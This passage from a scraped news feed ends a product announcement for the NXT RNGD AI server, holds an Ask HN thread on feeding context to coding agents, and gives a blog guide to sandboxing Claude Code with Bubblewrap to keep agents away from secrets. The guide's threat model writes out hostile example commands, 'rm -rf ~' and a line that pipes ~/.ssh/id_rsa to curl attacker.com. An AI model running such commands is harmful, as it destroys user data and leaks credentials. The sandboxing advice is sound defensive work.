    &lt;p&gt;Designed for compatibility, NXT RNGD Server runs at just 3 kW per system, allowing organizations to scale AI within the power and cooling limits of most modern facilities. This makes NXT RNGD Server a practical and cost-effective system to build out AI factories inside the data centers enterprises already operate.&lt;/p&gt;
    &lt;head rend="h2"&gt;Technical Specifications&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Compute: Up to 8 × RNGD accelerators (4 petaFLOPS FP8 per server) with dual AMD EPYC processors. Supports BF16, FP8, INT8, and INT4&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Memory: 384 GB HBM3 (12 TB/s bandwidth) plus 1 TB DDR5 system memory&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Storage: 2 × 960 GB NVMe M.2 (OS), 2 × 3.84 TB NVMe U.2 (internal)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Networking: 1G management NIC plus 2 × 25G data NICs&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Power &amp;amp; Cooling: 3 kW system power, redundant 2,000 W Titanium PSUs, air-cooled&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Security &amp;amp; Management: Secure Boot, TPM, BMC attestation, dual management paths (PCIe + I2C)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Software: Preinstalled Furiosa SDK and Furiosa LLM runtime with native Kubernetes and Helm integration&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Real-world benefits and proven performance&lt;/head&gt;
    &lt;p&gt;NXT RNGD Server’s superior power efficiency significantly lowers businesses’ TCO. Enterprise customers can run advanced AI efficiently at scale within current infrastructure and power limitations – using on-prem servers or cloud data centers. This is crucial for leveraging existing infrastructure, since more than 80% of data centers today are air-cooled and operate at 8 kW per rack or less. &lt;/p&gt;
    &lt;p&gt;For businesses with sensitive workloads, regulatory compliance requirements, or enhanced privacy and security needs, NXT RNGD Server offers complete control over enterprise data, with model weights running entirely on local infrastructure.&lt;/p&gt;
    &lt;p&gt;Global enterprises have validated NXT RNGD Server’s performance. In July, LG AI Research announced that it has adopted RNGD for inference computing with its EXAONE models. Running LG’s EXAONE 3.5 32B model on a single server with four RNGD cards and a batch size of one, LG AI Research achieved 60 tokens/second with a 4K context window and 50 tokens/second with a 32K context window.&lt;/p&gt;
    &lt;p&gt;We are now working with LG AI Research to supply NXT RNGD servers to enterprises using EXAONE across key sectors, including electronics, finance, telecommunications, and biotechnology.&lt;/p&gt;
    &lt;head rend="h2"&gt;Making rapid deployment of advanced AI available to everyone&lt;/head&gt;
    &lt;p&gt;With global data center demand at 60 GW in 2024 and expected to triple by the end of the decade, the industry faces a once-in-a-generation transformation. More than 80 percent of facilities today are air-cooled and operate at 8 kW per rack or less, making them poorly suited for GPU-based systems that require liquid cooling and 10 kW+ per server.&lt;/p&gt;
    &lt;p&gt;NXT RNGD Server provides a practical path forward. It allows organizations to deploy advanced AI within their existing facilities, without prohibitive energy costs or disruptive retrofits. Engineered as a plug-and-play system, NXT RNGD combines AI-optimized silicon with Furiosa LLM, a vLLM-compatible serving framework featuring built-in OpenAI API support, enabling organizations to deploy and scale AI workloads from day one.&lt;/p&gt;
    &lt;p&gt;By combining silicon and system design, NXT RNGD Server makes efficient, enterprise-ready, and future-proof AI infrastructure a reality.&lt;/p&gt;
    &lt;head rend="h2"&gt;Availability&lt;/head&gt;
    &lt;p&gt;We are taking inquiries and orders for January 2026.&lt;/p&gt;
    &lt;p&gt;Download the datasheet here and sign up for RNGD updates here.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46626410</guid><pubDate>Thu, 15 Jan 2026 00:53:21 +0000</pubDate></item><item><title>Ask HN: What is the best way to provide continuous context to models?</title><link>https://news.ycombinator.com/item?id=46626639</link><description>&lt;doc fingerprint="b756955719e293d4"&gt;
  &lt;main&gt;
    &lt;p&gt;With research done till date, what according to you is the best way to provide context to a model. Are there any articles that go into depth of how Cursor does it?&lt;/p&gt;
    &lt;p&gt;I think the emerging best way is to do "agentic search" over files. If you think about it, Claude Code is quite good at navigating large codebases and finding the required context for a problem.&lt;/p&gt;
    &lt;p&gt;Further, instead of polluting the context of your main agent, you can run a subagent to do search and retrieve the important bits of information and report back to your main agent. This is what Claude Code does if you use the keyword "explore". It starts a subagent with Haiku which reads ten of thousands of tokens in seconds.&lt;/p&gt;
    &lt;p&gt;From my experience the only shortcoming of this approach right now is that it's slow, and sometimes haiku misses some details in what it reads. These will get better very soon (in one or two generations, we will likely see opus 4.5 level intelligence at haiku speeds/price). For now, if not missing a detail is important for your usecase, you can give the output from the first subagent to a second one and ask the second one to find important details the first one missed. I've found this additional step to catch most things the first search missed. You can try this for yourself with Claude Code: ask it to create a plan for your spec, and then pass the plan to a second Claude Code session and ask it to find gaps and missing files from the plan.&lt;/p&gt;
    &lt;p&gt;Gemini 3 Flash is very good at the search task (it benchmarks quite close to 3 Pro in coding tasks but is much faster). I believe Amp switch to Gemini Flash for their search agent because it is better.&lt;/p&gt;
    &lt;p&gt;I very much doubt this. I've been using gemini whenever I get hit by codex limits over the past week. 3 pro is very good - a bit behind codex but still very useful. I've tried 3 flash several times and each time what I got back was complete garbage. After the third or fourth attempt I stopped trying.&lt;/p&gt;
    &lt;p&gt;I actually defended Gemini CLI when someone said this a few days ago. Then Murphy's law hit me with bug after bug, all of which have been reported many times already going back over year or more. I keep having to totally clear out the ~/.gemini folder and then it works again for a while.&lt;/p&gt;
    &lt;p&gt;Every time you send a request to a model you're already providing all of the context history along with it. To edit the context, just send a different context history. You can send whatever you want as history, it's entirely up to you and entirely arbitrary.&lt;/p&gt;
    &lt;p&gt;We only think in conversational turns because that's what we've expected a conversation to 'look like'. But that's just a very deeply ingrained convention.&lt;/p&gt;
    &lt;p&gt;Forget that there is such a thing as 'turns' in a LLM convo for now, imagine that it's all 'one-shot'.&lt;/p&gt;
    &lt;p&gt;So you ask A, it responds A1.&lt;/p&gt;
    &lt;p&gt;But when you and B, and expect B1 - which depends on A and A1 already being in the convo history - consider that you are actually sending that again anyhow.&lt;/p&gt;
    &lt;p&gt;Behind the scenes when you think you're sending just 'B' (next prompt) you're actually sending A + A1 + B aka including the history.&lt;/p&gt;
    &lt;p&gt;A and A1 are usually 'cached' but that's not the simplest way to do it, the caching is an optimization.&lt;/p&gt;
    &lt;p&gt;Without caching the model would just process all of A + A1 + B and B1 in return just the same.&lt;/p&gt;
    &lt;p&gt;And then A + A1 + B + B1 + C and expect C1 in return.&lt;/p&gt;
    &lt;p&gt;It just so happens it will cache the state of the convo at your previous turn, and so it's optimized but the key insight is that you can send whatever context you want at any time.&lt;/p&gt;
    &lt;p&gt;If after you send A + A1 + B + B1 + C and get C1, if you want to then send A + B + C + D and expect D1 ... (basically sending the prompts with no responses) - you can totally do that. It will have to re-process all of that aka no cached state, but it will definitely do it for you.&lt;/p&gt;
    &lt;p&gt;Heck you can send Z + A + X, or A + A1 + X + Y - or whatever you want.&lt;/p&gt;
    &lt;p&gt;So in that sense - what you are really sending (if you're using the simplest form API), is sending 'a bunch of content' and 'expecting a response'. That's it. Everything is actually 'one shot' (prefill =&amp;gt; response) and that's it. It feels conversational but structural and operational convention.&lt;/p&gt;
    &lt;p&gt;So the very simple answer to your question is: send whatever context you want. That's it.&lt;/p&gt;
    &lt;p&gt;If you know you will be pruning or otherwise reusing the context across multiple threads, the best place for context that will be retained is at the beginning due to prompt caching - it will reduce the cost and improve the speed.&lt;/p&gt;
    &lt;p&gt;If not, inserting new context any place other than at the end will cause cache misses and therefore slow down the response and increase cost.&lt;/p&gt;
    &lt;p&gt;Models also have some bias for tokens at start and end of the context window, so potentially there is a reason to put important instructions in one of those places.&lt;/p&gt;
    &lt;p&gt;What works best for me using Claude Code is to let the CC engineer its own context. You need to provide it with tools that it can use to engineer its context. CC comes with a lot of tools already (grep, sed, curl, etc), but for specific domain you may want to add more, e.g., access to a database, a cms, a parser for a bespoke language, etc.&lt;/p&gt;
    &lt;p&gt;With these i'll mostly just give it questions: what are some approaches to implement x, what are the pros and cons, what libraries are available to handle x? What data would you need to create x screen, or y report? And then let it google it, or run queries on your data.&lt;/p&gt;
    &lt;p&gt;I'll have it create markdown documents or skills to persist the insights it comes back with that will be useful in the future.&lt;/p&gt;
    &lt;p&gt;LLMs are pretty good at plan/do/check/act: create a plan (maybe to run a query to see what tables you have in your database), run the query, understand the output, and then determine the next step.&lt;/p&gt;
    &lt;p&gt;Your main goal should be to enable the PDCA loop of the LLM through tools you provide.&lt;/p&gt;
    &lt;p&gt;Tool calling + recursion seems to be the answer. Two tools are for manipulating the logical call stack - call/return. The trick is to not permit use of any meaningful tools at the root of recursion, but to always make their descriptions available. For instance, the root can't QueryWidgets or ExecuteShell, but any descendant of it can.&lt;/p&gt;
    &lt;p&gt;These constraints result in token-hungry activity being confined to child scopes that are fully isolated from their parents. The only way to communicate between stack frames is by way of the arguments to call() and return(). Theoretically, recursive dispatch gives us exponential scaling of effective context size as we descend into the call graph. It also helps to isolate bad trips and potentially learn from them.&lt;/p&gt;
    &lt;p&gt;I open 4 chat windows with Gemini 3.0 Pro. I paste in all file contents to each window. I ask them "which files would an AI need to do $TASK effectively?"&lt;/p&gt;
    &lt;p&gt;Each of the 4 responses will disagree, despite some overlap. I take the union of the 4 responses as the canonical set of files that an implementer would need to see.&lt;/p&gt;
    &lt;p&gt;This reduces the risk of missing key files, while increasing the risk of including marginally important files. An easy trade-off.&lt;/p&gt;
    &lt;p&gt;Then I paste the subset of files into GPT 5.2 Pro, and give it $TASK.&lt;/p&gt;
    &lt;p&gt;You could replace the upstream process with N codex sessions instead of N gemini chat windows. It doesn't matter.&lt;/p&gt;
    &lt;p&gt;This process can be automated with structured json outputs, but I haven't bothered yet.&lt;/p&gt;
    &lt;p&gt;It uses much inference compute. But it's better than missing key inputs and wasting time with hallucinated output.&lt;/p&gt;
    &lt;p&gt;That sounds cumbersome and even more wasteful than my own method of simply dumping a fixed selection of project code in Gemini for each set of requests. Is there any benefit to pruning?&lt;/p&gt;
    &lt;p&gt;We ran into this while building GTWY.ai. What worked for us wasn’t trying to keep a single model “continuously informed”, but breaking work into smaller steps with explicit context passed between them. Long-lived context drifted fast. Short-lived, well-scoped context stayed predictable.&lt;/p&gt;
    &lt;p&gt;Check out "cursor-mirror", this extended Anthropic Skill I've developed as a part of MOOLLM, which will tell you all about how cursor assembles its context:&lt;/p&gt;
    &lt;p&gt;See yourself think. Introspection tools for Cursor IDE — 47 read-only commands to inspect conversations, tool calls, context assembly, and agent reasoning from Cursor's internal SQLite databases.&lt;/p&gt;
    &lt;p&gt;By Don Hopkins, Leela AI — Part of MOOLLM&lt;/p&gt;
    &lt;p&gt;The Problem&lt;/p&gt;
    &lt;p&gt;LLM agents are black boxes. You prompt, they respond, you have no idea what happened inside. Context assembly? Opaque. Tool selection? Hidden. Reasoning? Buried in thinking blocks you can't access.&lt;/p&gt;
    &lt;p&gt;Cursor stores everything in SQLite. This tool opens those databases.&lt;/p&gt;
    &lt;p&gt;The Science&lt;/p&gt;
    &lt;p&gt;"You can't think about thinking without thinking about thinking about something." — Seymour Papert, Mindstorms: Children, Computers, and Powerful Ideas (Basic Books, 1980), p. 137&lt;/p&gt;
    &lt;p&gt;Papert's insight: metacognition requires concrete artifacts. Abstract introspection is empty. You need something to inspect.&lt;/p&gt;
    &lt;p&gt;This connects to three traditions:&lt;/p&gt;
    &lt;p&gt;Constructionism (Papert, 1980) — Learning happens through building inspectable artifacts. The Logo turtle wasn't about drawing; it was about making geometry visible so children could debug their mental models. cursor-mirror makes agent behavior visible so you can debug your mental model of how Cursor works.&lt;/p&gt;
    &lt;p&gt;Society of Mind (Minsky, 1986) — Intelligence emerges from interacting agents. Minsky's "K-lines" are activation patterns that recall mental states. cursor-mirror lets you see these patterns: which tools activated, what context was assembled, how the agent reasoned.&lt;/p&gt;
    &lt;p&gt;Schema Mechanism (Drescher, 1991) — Made-Up Minds describes how agents learn causal models through Context → Action → Result schemas. cursor-mirror provides the data for schema refinement: what context was assembled, what action was taken, what result occurred.&lt;/p&gt;
    &lt;p&gt;Here is the design and exploration and hacking session in which I iteratively designed and developed it, using MOOLLM's Constructionist "PLAY-LEARN-LIFT" methodology:&lt;/p&gt;
    &lt;p&gt;Currently only supports Cursor running on Mac, but I'd be happy to accept PRs for Linux and Windows support. Look at the cursor-chat-relection.md document to see how I had Cursor analyze its own directories, files, and sqlite databases and JSON schemas. Also looking for help developing mirrors and MOOLMM kernel drivers for other orchestrators like Claud Code, etc.&lt;/p&gt;
    &lt;p&gt;There is no such thing as continuous context. There is only context that you start and stop, which is the same as typing those words in the prompt. To make anything carry over to a second thread, it must be included in the second thread's context.&lt;/p&gt;
    &lt;p&gt;Rules are just context, too, and all elaborate AI control systems boil down to these contexts and tool calls.&lt;/p&gt;
    &lt;p&gt;In other words, you can rig it up anyway you like. Only the context in the actual thread (or "continuation," as it used to be called) is sent to the model, which has no memory or context outside that prompt.&lt;/p&gt;
    &lt;p&gt;&amp;gt; Furthermore, all of the major LLM APIs reward you for re-sending the same context with only appended data in the form of lower token costs (caching).&lt;/p&gt;
    &lt;p&gt;There's a little more flexibility than that. You can strip of some trailing context before appending some new context. This allows you to keep the 'long-term context' minimal, while still making good use of the cache.&lt;/p&gt;
    &lt;p&gt;i dont understand why these questions are so common? is it not obvious how one should use these capabilities? i compose my context in md file and send it through API. i wrote a simple lms.exe to send context and append response to the same file. why doesn't everyone else do that? i never believed in agents that compose their own context like Cursor. and i always pass the lowest reasoning value parameter to the API I can. why doesn't anyone else do this? you become dependent on a tool, you're already dependent some of you on fancy IDEs and agents. we're already dependent on top 3 vendors and openai is the only one that no one complains about from API key configuration side. you're gonna become dependent not only on LLMs but on the tooling as well? no thanks. anyone with a different opinion regarding this down to exact work flow, you are walking down the wrong path. you have to become efficient at converting electricity to text. admit it, some are just better than others while some will never get it at all. you know you won't because you know people in your life that never change their opinions about something, or always get into car accidents because they're a bad driver. you cant change these people and you might be one of them.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46626639</guid><pubDate>Thu, 15 Jan 2026 01:20:22 +0000</pubDate></item><item><title>Bubblewrap: A nimble way to prevent agents from accessing your .env files</title><link>https://patrickmccanna.net/a-better-way-to-limit-claude-code-and-other-coding-agents-access-to-secrets/</link><description>&lt;doc fingerprint="1d7cde100d851ecd"&gt;
  &lt;main&gt;
    &lt;p&gt;Last week I wrote a thing about how to run Claude Code when you don’t trust Claude Code. I proposed the creation of a dedicated user account &amp;amp; standard unix access controls. The objective was to stop Claude from dancing through your .env files, eating your secrets. There are some usability problems with that guide- I found a better approach and I wanted to share.&lt;/p&gt;
    &lt;p&gt;TL;DR: Use Bubblewrap to sandbox Claude Code (and other AI agents) without trusting anyone’s implementation but your own. It’s simpler than Docker and more secure than a dedicated user account.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Changed Since My Last Post&lt;/head&gt;
    &lt;p&gt;Immediately after publishing, I caught the flu. During three painful days in bed, I realized there are other better approaches. Firejail would likely work well- but also there’s another solution called Bubblewrap.&lt;/p&gt;
    &lt;p&gt;As I dug into Bubblewrap, I realized something else… Anthropic uses Bubblewrap!&lt;/p&gt;
    &lt;p&gt;But Anthropic embeds bubblewrap in their client. This implementation has a major disadvantage.&lt;/p&gt;
    &lt;p&gt;Embedding bubblewrap in the client means you have to trust the correctness and security of Anthropic’s implementation. They deserve credit for thinking about security, but this puzzles me. Why not publish guidance so users can secure themselves from Claude Code? Aren’t we going to need this for ALL agents? Isn’t this solution generalizable?&lt;/p&gt;
    &lt;p&gt;Defense-in-depth means we don’t rely on any single vendor to execute perfectly 100% of the time. Plus, this problem applies to all coding agents, not just Claude Code. I want an approach that doesn’t tie my security to Anthropic’s destiny.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Security Problem We’re Solving&lt;/head&gt;
    &lt;p&gt;Before we dive into Bubblewrap, here’s what we’re protecting against:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;You want to run a binary that will execute under your account’s permissions&lt;/item&gt;
      &lt;item&gt;Your account has access to sensitive files unrelated to the project you’re working on&lt;/item&gt;
      &lt;item&gt;You want your binary to invoke other standard system tools like &lt;code&gt;ls&lt;/code&gt;,&lt;code&gt;ps -aux&lt;/code&gt;, or&lt;code&gt;less&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;We want to invoke this binary while easily preventing it from accessing sensitive files unrelated to binary’s activities&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;What if Claude Code has a bug? What happens if the bug is exploited, and bubblewrap constraints embedded within the client are not activated? Will Claude Code run &lt;code&gt;rm -rf ~&lt;/code&gt; or &lt;code&gt;cat ~/.ssh/id_rsa | curl attacker.com&lt;/code&gt;?&lt;/p&gt;
    &lt;p&gt;Without your own wrapping of the agent, you’re at risk. When you wrap your coding agent calls with Bubblewrap, the agent’s access to dangerous commands is prevented.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Is Bubblewrap?&lt;/head&gt;
    &lt;p&gt;Bubblewrap lets you run untrusted or semi-trusted code without risking your host system. We’re not trying to build a reproducible deployment artifact. We’re creating a jail where coding agents can work on your project while being unable to touch &lt;code&gt;~/.aws&lt;/code&gt;, your browser profiles, your ~/Photos library or anything else sensitive.&lt;/p&gt;
    &lt;p&gt;Let’s explore Bubblewrap through the command line:&lt;/p&gt;
    &lt;code&gt;# Install it (Debian/Ubuntu)
sudo apt install bubblewrap

# Simplest possible sandbox - just isolate the filesystem view
bwrap --ro-bind /usr /usr --symlink usr/lib /lib --symlink usr/lib64 /lib64 \
      --symlink usr/bin /bin --proc /proc --dev /dev \
      --unshare-all --die-with-parent \
      /bin/bash

# Inside the sandbox, try:
ls /home          # Empty or nonexistent
ls /etc           # Empty or nonexistent  
whoami            # Shows "nobody" or your mapped user
ping google.com   # Fails - no network
&lt;/code&gt;
    &lt;head rend="h2"&gt;How This Command Works&lt;/head&gt;
    &lt;p&gt;This command creates a minimal sandboxed environment. Here’s what each part does:&lt;/p&gt;
    &lt;head rend="h3"&gt;Filesystem access:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;--ro-bind /usr /usr&lt;/code&gt;mounts your system’s&lt;code&gt;/usr&lt;/code&gt;directory as read-only inside the sandbox&lt;/item&gt;
      &lt;item&gt;The &lt;code&gt;--symlink&lt;/code&gt;commands create shortcuts so programs can find libraries and binaries in expected locations&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--proc /proc&lt;/code&gt;and&lt;code&gt;--dev /dev&lt;/code&gt;give minimal access to system processes and devices&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Isolation:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;--unshare-all&lt;/code&gt;disconnects the sandbox from all system resources (network, shared memory, mount points, etc.)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--die-with-parent&lt;/code&gt;kills the sandbox if your main terminal closes&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;The Result:&lt;/head&gt;
    &lt;p&gt;Bash runs inside a stripped-down environment. It can execute programs from &lt;code&gt;/usr&lt;/code&gt; but can’t see your home directory, config files, or access the network. Programs work, but they’re operating in a ghost town version of your filesystem.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why Bubblewrap Beats Docker&lt;/head&gt;
    &lt;p&gt;This beats Docker for quick workflows. Docker requires a running daemon and lots of configuration files. Bubblewrap lets you execute your app directly—no daemon, no stale containers cluttering your system.&lt;/p&gt;
    &lt;p&gt;If you’re experienced enough to worry about Docker misconfigurations, Bubblewrap gives you more control when you need it. You just run a command. No YAML files or debugging background services.&lt;/p&gt;
    &lt;head rend="h2"&gt;Quick Start: Running Claude Code with Bubblewrap&lt;/head&gt;
    &lt;p&gt;A big part of the reason for needing this, is –dangerously-skip-permissions. There are times when it’s very useful to give an agent autonomy in desiging, experimenting &amp;amp; implementing systems. Last week, I built a wifi access point that hosts a Quakeworld Server and vends web assembly quake clients. It’s an instant-lan party in a box. I did this unattended and it works. –dangerously-skip-permissions is very powerful- assuming you know how to aim it safely.&lt;/p&gt;
    &lt;p&gt;Here’s how I run Claude Code with &lt;code&gt;--dangerously-skip-permissions&lt;/code&gt; inside a Bubblewrap sandbox:&lt;/p&gt;
    &lt;code&gt;PROJECT_DIR="$HOME/Development/YourProject"
bwrap \
     --ro-bind /usr /usr \
     --ro-bind /lib /lib \
     --ro-bind /lib64 /lib64 \
     --ro-bind /bin /bin \
     --ro-bind /etc/resolv.conf /etc/resolv.conf \
     --ro-bind /etc/hosts /etc/hosts \
     --ro-bind /etc/ssl /etc/ssl \
     --ro-bind /etc/passwd /etc/passwd \
     --ro-bind /etc/group /etc/group \
     --ro-bind "$HOME/.gitconfig" "$HOME/.gitconfig" \
     --ro-bind "$HOME/.nvm" "$HOME/.nvm" \
     --bind "$PROJECT_DIR" "$PROJECT_DIR" \
     --bind "$HOME/.claude" "$HOME/.claude" \
     --tmpfs /tmp \
     --proc /proc \
     --dev /dev \
     --share-net \
     --unshare-pid \
     --die-with-parent \
     --chdir "$PROJECT_DIR" \
     --ro-bind /dev/null "$PROJECT_DIR/.env" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.local" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.production" \
     "$(command -v claude)" --dangerously-skip-permissions "Please review Planning/ReportingEnhancementPlan.md"
&lt;/code&gt;
    &lt;head rend="h3"&gt;Key Configuration Lines:&lt;/head&gt;
    &lt;code&gt;# Required for Claude Code to work
--ro-bind "$HOME/.nvm" "$HOME/.nvm" \

# Claude stores auth here. Without this, you'll re-login every time
--bind "$HOME/.claude" "$HOME/.claude" \

# Only add if you understand why you need SSH access
# --ro-bind "$HOME/.ssh" "$HOME/.ssh" \

# Block access to your .env files by overlaying with empty files (You need to know exact path of files 

     --ro-bind /dev/null "$PROJECT_DIR/.env" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.local" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.production" \
&lt;/code&gt;
    &lt;p&gt;Important: Most people don’t need the SSH line. It gives your agent the ability to SSH into systems where you’ve copied a public key. If you don’t understand the utility, don’t add it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why Not a Dedicated User Account?&lt;/head&gt;
    &lt;p&gt;My previous post proposed creating a custom user account for Claude on the host OS. This approach has three major problems:&lt;/p&gt;
    &lt;head rend="h3"&gt;1. ACL Tuning Becomes a Usability Nightmare&lt;/head&gt;
    &lt;p&gt;You’ll fight with file permissions constantly. You need to tune Access Control Lists to prevent access to sensitive &lt;code&gt;.env&lt;/code&gt; files. This type of friction has killed security initiatives for decades. Security dies on usability hills.&lt;/p&gt;
    &lt;p&gt;I came up with that approach while getting sick with the flu. Please accept my apologies.&lt;/p&gt;
    &lt;head rend="h3"&gt;2. No Network Connectivity Restrictions&lt;/head&gt;
    &lt;p&gt;A custom account doesn’t solve the network access problem. Claude agents can spin up sockets and connect to whatever they want. Unless you run UFW and restrict outbound connectivity from your host, you risk your agent exfiltrating content.&lt;/p&gt;
    &lt;p&gt;I’ve been creating agents that remotely administer and tune servers. It’s not responsible to let agents have source:any destination:any access to your network or the Internet. One wrong prompt puts you at risk of data exfiltration. My previous solution was incomplete.&lt;/p&gt;
    &lt;head rend="h3"&gt;3. Docker Is the Wrong Tool&lt;/head&gt;
    &lt;p&gt;Docker solves the “it works on my machine” problem when moving code from your laptop to production servers. But most people aren’t deploying frequently enough to maintain strong Docker skills.&lt;/p&gt;
    &lt;p&gt;Setting up filesystems and networking in containers takes mental effort. If you just want to run a command safely, you shouldn’t need to install and configure a background service. People want something that works quickly without the cognitive overhead.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why Use Your Own Bubblewrap Instead of Anthropic’s Sandbox?&lt;/head&gt;
    &lt;p&gt;Everyone makes security mistakes eventually. Claude Code is potentially dangerous. Which approach is safer?&lt;/p&gt;
    &lt;p&gt;Trust Anthropic: Hope their team never makes an implementation mistake that breaks security controls.&lt;/p&gt;
    &lt;p&gt;or&lt;/p&gt;
    &lt;p&gt;Don’t Trust Anthropic: Implement your own access controls in the operating system that constrain the binary at runtime.&lt;/p&gt;
    &lt;p&gt;There is one other big reason you should know how to leverage Bubblewrap. You need a solution for sandboxing agents that aren’t Claude Code.&lt;/p&gt;
    &lt;p&gt;Agents should never be considered trustworthy. Even when they have security controls. Put controls around them—don’t rely on agents built with models that have experienced misalignment.&lt;/p&gt;
    &lt;head rend="h2"&gt;A comparison of what you’re trusting with user-wrapped invocation of bubblewrap versus embedded bubblewrap in a client&lt;/head&gt;
    &lt;head rend="h3"&gt;Running Bubblewrap Yourself:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The Linux kernel’s namespace implementation&lt;/item&gt;
      &lt;item&gt;The Bubblewrap binary (small, auditable codebase)&lt;/item&gt;
      &lt;item&gt;Your own configuration (you wrote it, you understand it)&lt;/item&gt;
      &lt;item&gt;Your own proxy/filtering code&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Using Anthropic’s Sandbox Runtime:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Everything above, plus:&lt;/item&gt;
      &lt;item&gt;Anthropic’s wrapper code and configuration choices&lt;/item&gt;
      &lt;item&gt;Anthropic’s filtering proxy implementation&lt;/item&gt;
      &lt;item&gt;Anthropic’s update/distribution mechanism (npm)&lt;/item&gt;
      &lt;item&gt;That Anthropic’s security interests align with yours&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;The Trust Matrix&lt;/head&gt;
    &lt;p&gt;Trust isn’t binary—it’s about understanding what you’re trusting and why. Here’s a quick comparison:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Threat&lt;/cell&gt;
        &lt;cell role="head"&gt;DIY bwrap&lt;/cell&gt;
        &lt;cell role="head"&gt;Anthropic SRT&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Claude accidentally &lt;code&gt;rm -rf ~&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;✓ Protected&lt;/cell&gt;
        &lt;cell&gt;✓ Protected&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Claude exfiltrating ~/.ssh&lt;/cell&gt;
        &lt;cell&gt;✓ Protected&lt;/cell&gt;
        &lt;cell&gt;✓ Protected&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Supply chain attack via npm&lt;/cell&gt;
        &lt;cell&gt;✓ Not exposed&lt;/cell&gt;
        &lt;cell&gt;✗ Exposed&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Subtle misconfiguration&lt;/cell&gt;
        &lt;cell&gt;✗ Your risk&lt;/cell&gt;
        &lt;cell&gt;✓ Their expertise&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Agent Telemetry you don’t want sent&lt;/cell&gt;
        &lt;cell&gt;✓ You control&lt;/cell&gt;
        &lt;cell&gt;? Their choice&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Novel bypass techniques&lt;/cell&gt;
        &lt;cell&gt;✗ You’re on your own&lt;/cell&gt;
        &lt;cell&gt;✓ Their team watches&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;So in Anthropic’s defense: this is not cut-and-dried. Most companies don’t have resources for great security teams. You have to decide whether you can own this. Many companies will be wise to rely on Anthropic’s expertise. Their reputation is on the line if someone breaks their sandbox implementation. But you’re going to be locked into Anthropic’s security model if you don’t learn how to wield bubblewrap. Pivoting to a new agent will require figuring out security there. Why not just rip the band aid off and learn bubblewrap?&lt;/p&gt;
    &lt;head rend="h2"&gt;Don’t trust me either!&lt;/head&gt;
    &lt;p&gt;This has been a fun writeup on trusting trust. TRUST ME!&lt;/p&gt;
    &lt;p&gt;But you shouldn’t trust me! I might be a Dog on the Internet. Maybe I’m ai slop?!&lt;/p&gt;
    &lt;p&gt;Here is some code you can use to test the bwrap container I provided for my claude usage. Note that this is invoked different- we’re not going to call claude- we’re going to call bash and pass it the test script. My test script is available here:&lt;/p&gt;
    &lt;p&gt;All you need to do is create a YourProject folder in your ~/$HOME/Development directory. Then create a sandbox-escape-test.sh in there. Fill it with the test code from my github.&lt;/p&gt;
    &lt;p&gt;Read and understand what the script does before executing it. This post is already pretty long 😀&lt;/p&gt;
    &lt;head rend="h2"&gt;Wrapping Up&lt;/head&gt;
    &lt;p&gt;I’m building with many agents—not just Claude Code. I need a generalized solution for sandboxing that I can apply to other agents.&lt;/p&gt;
    &lt;p&gt;Anthropic deserves attention and credit for the constraints they’re giving you. I wish they had published them in a way that doesn’t tie your security destiny to their ability to execute correctly 100% of the time.&lt;/p&gt;
    &lt;p&gt;The choice is yours: trust a vendor’s implementation, or take control of your own security boundaries. Both are valid. I might be paranoid. Are you feeling lucky?&lt;/p&gt;
    &lt;p&gt;p.s. If I ever get run over by a flaming pizza truck, here’s a handy 1 liner:&lt;/p&gt;
